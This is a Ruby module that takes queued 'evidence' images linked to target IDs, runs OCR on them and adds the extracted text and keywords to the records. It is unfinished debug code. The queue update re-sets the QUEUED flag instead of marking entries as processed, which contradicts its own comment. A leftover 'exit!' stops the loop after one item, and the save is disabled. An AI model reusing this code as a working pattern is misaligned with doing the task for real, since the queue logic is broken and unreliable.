#
# OCR processing module
#
# the evidence to be processed are queued by the workers
#

# we need to execute the weaver inside the ocr directory
# to satisfy all the dll dependencies
Dir.chdir 'ocr'
require_relative 'weaver'
Dir.chdir '..'

require 'rcs-common/trace'
require 'fileutils'

module RCS
module OCR

class Processor
  extend RCS::Tracer

  def self.run
    db = Mongoid.database
    coll = db.collection('ocr_queue')

    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if entry = coll.find_and_modify({query: {flag: OCRQueue::QUEUED}, update: {"$set" => {flag: OCRQueue::QUEUED}}})
        trace :debug, "Processing: " + entry.inspect
        process entry

        # TODO: remove this
        exit!
      else
        trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  end


  def self.process(entry)
    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])

    trace :debug, ev.inspect
    start = Time.now

    temp = RCS::DB::Config.instance.temp(ev[:data]['_grid'].to_s)
    output = temp + '.ocr'

    # dump the binary to the temp directory
    file = RCS::DB::GridFS.get ev[:data]['_grid'], entry['target_id']
    File.open(temp, 'wb') {|d| d.write file.read}

    trace :debug, "IMAGE: #{temp}"
    trace :debug, "OCR: #{output}"

    # invoke the ocr on the temp file and get the result
    Weaver.transform temp, output

    raise "output file not found" unless File.exist?(output)

    ocr_text = File.open(output, 'r') {|f| f.read}

    FileUtils.rm_rf temp
    #FileUtils.rm_rf output

    # update the evidence with the new text
    ev[:data][:body] = ocr_text

    trace :debug, "KEYWORDS: " + ocr_text.keywords.inspect

    ev[:kw] += ocr_text.keywords

    trace :debug, ev.inspect

    # TODO: enable this
    #ev.save

    trace :info, "Evidence processed in #{Time.now - start} seconds"

  rescue Exception => e
    trace :error, "Cannot process evidence: #{e.message}"
    trace :fatal, e.backtrace.join("\n")
  end


end

end #OCR::
end #RCS::